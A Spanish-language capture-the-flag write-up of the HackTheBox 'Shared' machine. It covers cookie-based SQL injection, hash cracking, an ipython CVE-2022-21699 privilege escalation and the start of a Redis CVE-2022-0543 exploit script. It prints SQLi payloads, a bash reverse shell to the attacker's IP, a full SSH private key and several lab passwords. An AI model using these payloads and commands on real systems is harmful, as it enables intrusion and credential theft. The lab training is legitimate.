---
title: "HTB: Resolución de Shared"
date: 2022-09-30 19:00:00 +/-TTTT
categories: [HTB, Linux]
tags: [sqli,cve-2022-21699,cve-2022-0543]     ## TAG names should always be lowercase
image: /photos/2022-09-30-Shared-WriteUp/htb.jpg
---

**Shared** es una máquina ***Linux*** en la que explotaremos un **SQL injection** para conseguir las credenciales de un usuario llamado james_mason. Posteriormente, pivotaremos al usuario dan_smith explotando una **vulnerabilidad** ligada a una herramienta llamada ***ipython*** que corre el usuario *dan_smith* a intervalos regulares de tiempo. Finalmente, para convertirnos al usuario *root* explotaremos un **RCE** en el servicio ***Redis***, que nos permitirá ejecutar comandos como *root*, ya que es el que está corriendo el servicio.

## Información de la máquina 

<table width="100%" cellpadding="2">
    <tr>
        <td>
            <img src="/photos/2022-09-30-Shared-WriteUp/Shared.png" alt="drawing" width="465" />  
        </td>
        <td>
            <img src="/photos/2022-09-30-Shared-WriteUp/graph.png" alt="drawing" width="400" />  
        </td>
    </tr>
</table>

##  Reconocimiento  

### ping  

Primero enviaremos un *ping* a la máquina victima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.

<img src="/photos/2022-09-30-Shared-WriteUp/ping.png" alt="drawing" />  

Vemos que nos enfrentamos a una máquina ***Linux*** ya que su ttl es 63.
 
### nmap  

Ahora procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ```nmap```. 

<img src="/photos/2022-09-30-Shared-WriteUp/allports.png" alt="drawing"  />  

**-sS** efectúa un *TCP SYN Scan*, iniciando rápidamente una conexión sin finalizarla.  
**-min-rate 5000** sirve para enviar paquetes no mas lentos que 5000 paquetes por segundo.  
**-n** sirve para evitar resolución DNS.  
**-Pn** para evitar host discovery.  
**-vvv** triple *verbose* para que nos vuelque la información que vaya encontrando el escaneo.  
**-p-** para escanear todo el rango de puertos.  
**--open** para escanear solo aquellos puertos que tengan un *status open*.  
**-oG** exportará la evidencia en formato *grepeable* al fichero **allPorts** en este caso.

Una vez descubiertos los **puertos abiertos**, que en este caso son el **22, el 80 y el 443**, lanzaremos una serie de *scripts* básicos de enumeración contra estos, en busca de los servicios que están corriendo y de sus versiones. 

Ejecutaremos: ```nmap -sCV -p22,80,443 10.10.11.170 -oN targeted```. Obtendremos el siguiente volcado:

<img src="/photos/2022-09-30-Shared-WriteUp/targeted.png" alt="drawing"  />  

El puerto **22** es **SSH** y el puerto **80** y **443** son **HTTP** y **HTTPS**, respectivamente. De momento, como no disponemos de credenciales para autenticarnos contra *SSH*, nos centraremos en auditar los puertos 80 y 443.

### Puertos 80 y 443 abiertos (HTTP y HTTPS)  

Gracias a los *scripts* de reconocimiento que lanza *nmap*, podemos ver que el servicio web que corre en el puerto 80 nos redirige al dominio ***shared.htb***. Para que nuestra máquina pueda resolver a este dominio deberemos ponerlo en nuestro */etc/hosts*, de la siguiente manera:

<img src="/photos/2022-09-30-Shared-WriteUp/etchosts.png" alt="drawing"  />  

De esta forma ya podremos visualizar la web, pero antes, siempre me gusta tirar de la herramienta ***whatweb*** para enumerar las tecnologías que corren detrás del servicio. Si empezamos tirando un *whatweb* contra el puerto 80 podemos ver lo siguiente:

<img src="/photos/2022-09-30-Shared-WriteUp/whatwebhttp.png" alt="drawing"  />  

Después de unas cuantas redirecciones, nos acaba llevando a ***https://shared.htb/index.php***, es decir, al servicio web que corre en el puerto 443. Por lo tanto, tanto en el puerto 80 HTTP como en el puerto 443 HTTPS veremos lo mismo.

Este servicio web utiliza *nginx 1.18.0* como servidor y parece que como CMS está corriendo ***PrestaShop***, un sistema orientado al comercio electrónico.  

Si lanzamos un curl, podremos extraer mas información sobre todas estas redirecciones que se acontecen en el puerto 80. Podemos ver que nos incorpora algunas *cookies* cuando llegamos al dominio destino.

<img src="/photos/2022-09-30-Shared-WriteUp/curl.png" alt="drawing"  />  

#### Analizando https://shared.htb 

Cuando accedemos a la página web vemos lo siguiente:

<img src="/photos/2022-09-30-Shared-WriteUp/indexhtml.png" alt="drawing"  />  

Nos dicen que han tenido un problema de espacio de disco y que han lanzado un nuevo sistema de *checkout*. Luego investigaremos esta pata. Por lo demás, vemos que es un página básica de compra online.   

Como se que me estoy enfrentando a un CMS llamado ***PrestaShop***, antes de nada voy a buscar ***exploits*** relacionados con este servicio. 

<img src="/photos/2022-09-30-Shared-WriteUp/searchsploitprestashop.png" alt="drawing"  /> 

Vemos que hay unos cuantos, muchos de ellos relacionados con inyecciones SQL. Como de momento no sabemos la versión del *PrestaShop*, dejaremos esta información apartada. 

Después de investigar un poco la web, descubro *endpoints* interesantes, como ```https://shared.htb/index.php?controller=authentication```, donde nos podremos autenticar o crearnos una cuenta, pero no encontraremos nada vulnerable. 

En este punto, lanzo la herramienta ***wfuzz*** para encontrar subdominios interesantes:

<img src="/photos/2022-09-30-Shared-WriteUp/subdomainfuzzing.png" alt="drawing"  />  

**-c** es formato colorizado.  
**--hh=169** para esconder todas aquellas repuestas que devuelvan un número de caracteres igual a 169 (en este caso un subdominio erróneo devuelve esta cantidad de caracteres).  
**-w** para especificar el diccionario que queremos utilizar. Para *fuzzear* subdirectorios yo casi siempre utilizo el mismo, *subdomains-top1million-110000.txt*. Este diccionario se puede encontrar en el repositorio de [SecLists](https://github.com/danielmiessler/SecLists).  
**-u** para especificar la *url*.  
**-t** para especificar el número de *threads* a utilizar.  
**-H** para especificar *Headers* adicionales. **FUZZ** es una palabra especial de *wfuzz* y es donde se sustituirá cada linea del diccionario.

Nos encuentra dos subdominios; ***www*** que no nos devuelve información (el número de lineas es 0) y ***checkout*** que si que tiene contenido. Entonces, para poder resolver a ***checkout.shared.htb*** deberemos introducir este dominio en nuestro */etc/hosts*:

<img src="/photos/2022-09-30-Shared-WriteUp/etchostssubdomain.png" alt="drawing"  />  

####  Analizando https://checkout.shared.htb/ 

Si introducimos ***https://checkout.shared.htb/*** en el navegador nos encontraremos con lo siguiente:

<img src="/photos/2022-09-30-Shared-WriteUp/indexhtmlsubdomain.png" alt="drawing"  />  

Este paso de análisis de subdirectorios con *wfuzz* nos lo podríamos haber ahorrado si hubiésemos investigado un poco mas la web, ya que si vas a la cesta y luego pinchas en ***PROCEED TO CHECKOUT*** también nos hubiera llevado al mismo sitio.

Estamos ante una página muy simple donde pongas los que pongas en los campos de *input* siempre te salta el mismo *alert*: *Your payment was successfully received*. 

Lo interesante ocurre en la **petición GET** que se tramita a ***https://checkout.shared.htb/***. La podemos interceptar con el propio navegador o con *BurpSuite*.

<img src="/photos/2022-09-30-Shared-WriteUp/burpsubdomain.png" alt="drawing"  />  

Nos está incorporando una ***cookie***: ```Cookie: custom_cart={"CRAAFTKP":"1"};``` que si *urldecodeamos* podemos ver que contiene información sobre nuestra cesta. Un campo hace referencia al nombre del producto mientras que otro a su cantidad.  

##  Consiguiendo shell como james_mason  

De la *cookie* anterior, el campo referente a la cantidad no parece ser **inyectable** ya que ponga el *payload* que ponga la web me responde con el mismo código. Pero no ocurre lo mismo con el campo que hace referencia al **nombre del producto**. Parece que por detrás se están ejecutando queries que cogen el valor de este campo. De hecho inyectando ```test' or sleep(5)-- -``` me doy cuenta que cuando pones *sleep* la web te responde diferente:

<img src="/photos/2022-09-30-Shared-WriteUp/sleepcookie.png" alt="drawing"  /> 

Por curiosidad, vuelvo a tirar de ***wfuzz*** para aplicar fuerza bruta sobre este campo y ver que palabras son las que hacen que la web responda de otra manera:

<img src="/photos/2022-09-30-Shared-WriteUp/sleepcookiefuzzing.png" alt="drawing"  />  

Por lo visto, aquellas palabras que contengan ***sleep*** o ***benchmark*** provocan este suceso.

### SQL Injection  

Otro *payload* con el que pruebo es con ```test' order by 100-- -```, con la finalidad de saber el numero de columnas de la tabla que esta utilizando la máquina víctima, pero como no vemos ningún error no obtendremos nada relevante.

Aunque no sepa el numero de columnas, pruebo con queries *union select* esperando dar con el numero de columnas correcto. En efecto, con la query ```test' union select 1,2,3-- -``` consigo dar con el número correcto de columnas (**3 columnas**) mostrándome el número 2 en el campo *product*, lo que quiere decir que si inyecto *queries* en este campo podré ver el *output*. 
 
<img src="/photos/2022-09-30-Shared-WriteUp/sqliunionselect.png" alt="drawing"  />  

Podemos ver que como nombre de producto me ha devuelto un '2'.

Es hora de diseñar *queries SQL* especialmente diseñadas para que nos vuelquen información de la base de datos. Empezaremos primero listando las bases de datos disponibles con:

```test' union select 1,group_concat(schema_name),3 from information_schema.schemata-- -```

<img src="/photos/2022-09-30-Shared-WriteUp/sqlidatabases.png" alt="drawing"  />  

Con *group_concat* hacemos que nos meta todas las bases de datos disponibles en un campo. Vemos que hay dos: **checkout** e **information_schema**. Ahora vamos a listar las tablas de *checkout* con:

```test' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='checkout'-- -```

<img src="/photos/2022-09-30-Shared-WriteUp/sqlitables.png" alt="drawing"  />  

Esta *BBDD* tiene dos tablas: ***user*** y ***product***. Nos centraremos en *user* ya que puede contener credenciales de usuarios. 

Ahora, para listar las columnas de la tabla *user*, jugaremos con:

```test' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='checkout' and table_name='user'-- -```

<img src="/photos/2022-09-30-Shared-WriteUp/sqlicolumns.png" alt="drawing"  />  

Esta tabla tiene 3 columnas: ***id***, ***username*** y ***password***. Nos interesa la información que pueda haber en las columnas *username* y *password*. Por lo tanto, haremos:

```test' union select 1,group_concat(username,0x3a,password),3 from user-- -```

<img src="/photos/2022-09-30-Shared-WriteUp/sqlidump.png" alt="drawing"  />  

Obtendremos la siguiente credencial : ```james_mason:fc895d4eddc2fc12f995e18c865cf273```.  

### Rompiendo hash con John The Ripper  

Parece que la contraseña está *hasheada* en **MD5**. Podemos intentar **romper** el ***hash*** con herramientas de fuerza bruta como por ejemplo ***John The Ripper***. Pero antes, para comprobar que es un hash MD5, podemos utilizar la herramienta *hashid*:

<img src="/photos/2022-09-30-Shared-WriteUp/hashformat.png" alt="drawing"  />  

El parámetro -j nos indica que formato tenemos que especificar en john para romper el *hash*. Ahora que ya tenemos toda la información necesaria, procedemos al *crackeo* de la contraseña.

<img src="/photos/2022-09-30-Shared-WriteUp/john.png" alt="drawing"  />  

Después de unos segundos, nos descubre que la contraseña es ***Soleil101***. Por lo tanto ya tenemos unas credenciales, que aun no sabemos si son válidas: ```james_mason:Soleil101```.

Si probamos a autenticarnos por ssh: 

<img src="/photos/2022-09-30-Shared-WriteUp/sshjames.png" alt="drawing"  />

Ahora lo que nos interesará será llevar a cabo una **escalada de privilegios** para convertirnos al usuario ***root*** y tener el control total de la máquina.

##  Consiguiendo shell como dan_smith  

### Reconocimiento del sistema  

#### Analizando index.php 

Antes de empezar con el reconocimiento de la máquina, vamos a inspeccionar el ***index.php*** de la web ***https://checkout.shared.htb/*** para entender por que se acontece la ***SQL injection***. El contenido que nos interesa del fichero es el siguiente y lo podemos encontrar en la ruta */var/www/checkout.shared.htb*:

```php
<?php
    include('config/db.php');

    $conn = new mysqli(DBHOST, DBUSER, DBPWD, DBNAME);
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    }
    
    $total=0;
    $cart_content = [];
    if(isset($_COOKIE["custom_cart"])) {
        $custom_cart = json_decode($_COOKIE["custom_cart"], true);
        $i=0;
        foreach($custom_cart as $code => $qty) {
            $sql = "SELECT id, code, price from product where code='".$code."'";
            
            // Prevent time-based sql injection
            if(strpos(strtolower($sql), "sleep") !== false || strpos(strtolower($sql), "benchmark") !== false)
                continue;
                
            $result = $conn->query($sql);

            if($result && mysqli_num_rows($result) >= 1) {
                $product = mysqli_fetch_assoc($result);
                
                if(isset($product["price"]) && is_numeric($product["price"]))
                    $total += $product["price"];

                $cart_content[$i]["code"]=$product["code"];
                $cart_content[$i]["price"]=$product["price"];
                $cart_content[$i]["qty"]=$qty;
                $i++;
            }
            else {
                $cart_content[$i]["code"]="Not Found";
                $cart_content[$i]["price"]=0;
                $cart_content[$i]["qty"]=0;
                $i++;
            }
        }
    }
    
    $conn->close();
?>
```

Podemos ver que de la cookie *custom_cart* coge el campo del producto, llamado *code*, y **lo sustituye directamente en la *query sql*** haciéndolo vulnerable a SQLI.  

Además, ya le encontramos sentido a por qué cuando poníamos palabras que contenían las cadenas ***sleep*** o ***benchmark*** nos devolvían un resultado diferente. 

#### Grupos de james_mason 

Vemos que ***james_mason*** pertenece a un grupo interesante llamado ***developer***.

```python
james_mason@shared:~$ id 
uid=1000(james_mason) gid=1000(james_mason) groups=1000(james_mason),1001(developer)
```

Si listamos todos aquellos ficheros y directorios del sistema que tengan como grupo *developer* nos encontraremos con el siguiente directorio. Tenemos **todos los permisos** sobre la carpeta ***scripts_review***. No hay nada en su interior.

```python
james_mason@shared:/home/dan_smith$ find / -group developer 2>/dev/null -ls
    46286      4 drwxrwx---   2 root     developer     4096 Sep 30 08:47 /opt/scripts_review
```

#### Puertos abiertos 

Dejando apartado el punto anterior, si listamos los **puertos abiertos**, nos encontramos con que la máquina esta corriendo internamente el servicio de ***Redis*** (6379) y ***msyql*** (3306).
 
```python
james_mason@shared:~$ netstat -natp tcp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6379          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0     36 10.10.11.172:22         10.10.14.12:60390       ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -       
```

#### Servicio SQL 

No tiene mucho sentido conectarse a la base de datos, ya que toda la información que nos interesaba ya la obtuvimos en la inyección SQL. Pero nunca está de mas comprobar que no nos hayamos dejado nada por mirar.

Para conectarnos al servicio de ***mysql*** necesitamos proveer de **credenciales válidas**. Podemos probar con las de este usuario pero no conseguiremos conectarnos. Otra cosa que podemos hacer es buscarlas en algún fichero de configuración del servicio web, ya que sabemos que la web tramitaba queries a una base de datos y a lo mejor las credenciales de acceso están ***hardcodeadas***.  

Los directorios de los servicios web se suelen encontrar en la ruta */var/www/*. Si investigamos, encontraremos el archivo ***/var/www/checkout.shared.htb/config/db.php*** con el siguiente contenido.

```php
james_mason@shared:~$ cat /var/www/checkout.shared.htb/config/db.php 
<?php
define('DBHOST','localhost');
define('DBUSER','checkout');
define('DBPWD','a54$K_M4?DdT^HUk');
define('DBNAME','checkout');
?>
```
En este punto podremos conectarnos con ```mysql u checkout -pa54$K_M4?DdT^HUk``` pero no encontraremos nada de interés.


#### Redis 

Otro servicio que estaba expuesto internamente es ***Redis***. Redis es básicamente un base de datos en memoria. Nos podremos conectar a este con la herramienta ***redis-cli***. Hay veces que sin proveer de credenciales *Redis* te deja listar toda la información, pero este no sera el caso. Con el comando ***info*** veremos que nos pide autenticación. Pero después de probar con diversas credenciales **no me consigo conectar**. La escalada tampoco va por aquí.

```python
127.0.0.1:6379> info
NOAUTH Authentication required.
127.0.0.1:6379> auth james_mason Soleil101
(error) WRONGPASS invalid username-password pair
127.0.0.1:6379> auth Soleil101
(error) WRONGPASS invalid username-password pair
127.0.0.1:6379> auth checkout a54$K_M4?DdT^HUk
(error) WRONGPASS invalid username-password pair
127.0.0.1:6379> auth a54$K_M4?DdT^HUk
(error) WRONGPASS invalid username-password pair
127.0.0.1:6379> 
```

#### Reconocimiento del sistema con pspy 

***Pspy*** es una herramienta que nos permite ver que tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).  

El programa se puede transferir a la máquina victima desplegando un servidor en python ```(python3 -m http.server 80)``` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como /tmp o /dev/shm) hacer un wget para descargar el archivo.  

Nos encontramos que cada cierto tiempo se está ejecutando lo siguiente:

<img src="/photos/2022-09-30-Shared-WriteUp/pspy.png" alt="drawing"  />  

Un usuario con uid 1001 está matando un programa llamado ***ipython*** (*/usr/bin/pkill ipython*), luego se mete en la carpeta ***/opt/scripts_review*** y finalmente **ejecuta *ipython*** (*/usr/local/bin/iypthon*).

En pocas palabras, ipython es una versión interactiva de python con funcionalidades adicionales. 

Lo primero es saber quién es el usuario que tiene asignado el uid 1001. *James_mason* tiene uid 1000. Si hacemos ```id dan_smith``` podemos ver que **tiene uid 1001** y por tanto es el que está ejecutando esta serie de comandos. 

```python
james_mason@shared:/home$ id dan_smith
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```

Esta información es importante, ya que si consiguiésemos vulnerar alguna de las instrucciones que está ejecutando ***dan_smith*** podríamos conseguir **ejecutar comandos como este usuario** y pivotar a él.

Buscando en internet vulnerabilidades asociadas a *ipython*, encuentro rápidamente un recurso de [github](https://github.com/advisories/GHSA-pq7m-3gw7-gq5x) que contiene un PoC del **CVE-2022-21699**.  

Si esta versión de *ipython* es vulnerable, conseguiremos ejecutar comandos como *dan_smith* (**RCE**).

Otras tareas interesantes son:  

Una tarea ejecutada por ***root*** que se encarga de **borrar** todo el **contenido del directorio */opt/scripts_review***: 

<img src="/photos/2022-09-30-Shared-WriteUp/rmroot.png" alt="drawing"  /> 

Y otra también ejecutada por **root** donde vemos que **ejecuta el servicio de *Redis***. Si obtuviésemos unas credenciales válidas para *Redis*, una posible vía de escalada de privilegios podría ser vulnerar este servicio.

<img src="/photos/2022-09-30-Shared-WriteUp/redispspy.png" alt="drawing"  /> 

### ipython CVE-2022-21699  

Según el PoC anterior, al **atacante** deberá de realizar 3 pasos:

* Crear una **carpeta *profile_default***.
* Crear una **subcarpeta *startup*** en *profile_default*.
* Crear un archivo ***foo.py*** dentro de *startup* con el **comando** que quiere el atacante que ejecute la víctima.

Por otro lado, la **víctima** deberá de **ir** al directorio donde se encuentra la carpeta ***profile_default*** y **ejecutar** el ***ipython***.

Entonces, si repasamos la información que obtuvimos anteriormente, tenemos que *pspy* nos mostró que ***dan_smith*** se dirigía a ***/opt/scripts_review*** y luego **ejecutaba */usr/local/bin/iypthon***. Aparte también vimos que ***james_mason*** tiene **todos los permisos** (lectura, escritura y acceso a la carpeta) sobre la carpeta ***scripts_review*** ya que pertenece al grupo *developers*. 

Por lo tanto, lo que haré sera situarme en la ruta */opt/scripts_review* y crear los archivos que figuran en el PoC. De la siguiente manera:

```python
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startup
james_mason@shared:/opt/scripts_review$ echo 'import os; os.system("ping -c 1 10.10.14.12")' > profile_default/startup/foo.py
```
En este caso, voy a hacer que la víctima me envié un ***ping*** para confirmar que el ***RCE*** se acontece. Espero un rato y lo recibo:

<img src="/photos/2022-09-30-Shared-WriteUp/pingreceived.png" alt="drawing"  /> 

Ahora que ya sabemos que todo funciona correctamente, vamos a enviarnos una ***shell***.

Lo que hare será crear en */tmp* un archivo ***rev.sh*** que se encargará de enviarme una ***shell*** cuando sea ejecutado por la **víctima**.

```python
james_mason@shared:/opt/scripts_review$ cat /tmp/rev.sh 
bash -i >& /dev/tcp/10.10.14.12/443 0>&1
```

Siguiendo los mismos pasos de antes, ejecutamos los siguiente comandos y **obtendremos una shell como *dan_smith***.

```python
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default
james_mason@shared:/opt/scripts_review$ mkdir -m 777 profile_default/startup
james_mason@shared:/opt/scripts_review$ echo 'import os; os.system("bash /tmp/rev.sh")' > profile_default/startup/foo.py
```

<img src="/photos/2022-09-30-Shared-WriteUp/revshelldan.png" alt="drawing"  />  

Una vez recibida la shell, deberemos hacerle un **tratamiento** para que nos permita poder hacer *Ctrl+C*, borrado de los comandos, movernos con las flechas... Los  comandos que ingresaremos serán:

```python
import /dev/null -c bash
*Ctrl+Z*
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

También deberemos **ajustar el número de filas y de columnas** de esta *shell*. Con el comando ```stty size``` podemos consultar nuestras filas y columnas y con el comando ```stty rows <rows> cols <cols>``` podemos ajustar estos campos.

Ahora vamos a reconocer el sistema como este usuario a ver si como ***dan_smith*** podemos escalar a ***root***.

## Consiguiendo shell como root  

### Reconocimiento del sistema  

***dan_smith*** tiene asignada una **clave privada id_rsa**. La podemos utilizar para conectarnos por **ssh** sin proveer la contraseña de de este usuario. ```chmod 600 id_rsa; ssh dan_smith@10.10.11.172 -i id_rsa```

```
dan_smith@shared:~$ cat .ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

#### User flag 

Podremos encontrar la ***user flag*** en el *homdedir* de *dan_smith*.

```python
dan_smith@shared:~$ cat user.txt 
bff8846d33329d00fc02b44171188ada
```


#### Grupos de dan_smith 

Este usuario se encuentra dentro de tres grupos: el suyo propio, *developer*, que ya lo habíamos investigado anteriormente, y ***sysadmin***.

```python
dan_smith@shared:~$ id
uid=1001(dan_smith) gid=1002(dan_smith) groups=1002(dan_smith),1001(developer),1003(sysadmin)
```

Si buscamos en el sistema aquellos archivos que tienen como grupo asignado *sysadmin* nos encontramos con un binario llamado ***redis_connector_dev***. Como *sysadmin* tenemos **permisos** tanto de **lectura** como de **ejecución** sobre este.

```python
dan_smith@shared:~$ find / -group sysadmin 2>/dev/null -ls
    17914   5836 -rwxr-x---   1 root     sysadmin  5974154 Mar 20  2022 /usr/local/bin/redis_connector_dev
```

#### Binario redis_connector_dev 

Cuando ejecutamos el binario este nos devuelve **información sobre el servicio de *Redis***. Recordemos que para conectarnos a *Redis* en la máquina víctima necesitamos **credenciales válidas**. Es posible que cuando ejecutemos el binario estén viajando credenciales para que sea posible poder volcar toda esta información.

```python
dan_smith@shared:~$ /usr/local/bin/redis_connector_dev
[+] Logging to redis instance using password...

INFO command result:
## Server
redis_version:6.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:4610f4c3acf7fb25
redis_mode:standalone
os:Linux 5.10.0-16-amd64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:10.2.1
process_id:3095
run_id:5681b85d42167d517116fc5b7830190b5632de15
tcp_port:6379
uptime_in_seconds:11
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:3597894
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
 <nil>
dan_smith@shared:~$ 
```

Como dispongo de permisos de lectura voy a transportarme el binario a mi equipo para poder analizarlo. Dándole permisos de ejecución y ejecutándolo obtenemos lo siguiente:

<img src="/photos/2022-09-30-Shared-WriteUp/redis-connector.png" alt="drawing"  /> 

Nos pone **conexión denegada** ya que espera que esté corriendo Redis en el puerto 6379 y en nuestra máquina no está. Pero vamos a utilizar ***netcat*** para ponernos en escucha por este puerto a ver si le gusta y recibimos algo interesante.

<img src="/photos/2022-09-30-Shared-WriteUp/redis-connectornc.png" alt="drawing"  />

En efecto, estamos recibiendo una **autenticación**: ```auth F2WHqJUz2WEz=Gqq```

Ahora podemos volver a la máquina víctima y utilizarla para autenticarnos:

```python
dan_smith@shared:~$ redis-cli
127.0.0.1:6379> info
NOAUTH Authentication required.
127.0.0.1:6379> auth F2WHqJUz2WEz=Gqq
OK
```

Una vez dentro podemos listar las **bases de datos disponibles** con ```info keyspace```

```python
127.0.0.1:6379> info keyspace
## Keyspace
```

Pero **no hay ninguna** disponible. 

También podemos mirar **vulnerabilidades asociadas** a este servicio. Con un poco de suerto podemos encontrar un ***RCE*** válido para esta **versión de *Redis*** y poder así ejecutar comandos como el usuario que corre *Redis* que recordemos que es ***root***. Utilizaré [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) para encontrar vulnerabilidades asociadas. Después de probar con varios CVEs encuentro uno que funciona. Es el **CVE-2022-0543**. 

[Hacktricks LUA sandbox bypass](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#lua-sandbox-bypass) nos comparte un repositorio de github con un *script* que al ejecutarlo nos debería de dar ejecución remota de comandos.

### Redis CVE-2022-0543 

El *script* es un código en python que he modificado ligeramente. Le he añadido el campo ***password*** con la contraseña de *Redis* para que al ejecutarlo nos podamos autenticar. También he *hardcodeado* la ip y el puerto para que la ejecución sea mas rápida.

```python
import redis
import sys

def echoMessage():
	version = """  
      [#] Create By ::
        _                     _    ___   __   ____                             
       / \   _ __   __ _  ___| |  / _ \ / _| |  _ \  ___ _ __ ___   ___  _ __  
      / _ \ | '_ \ / _` |/ _ \ | | | | | |_  | | | |/ _ \ '_ ` _ \ / _ \| '_ \ 
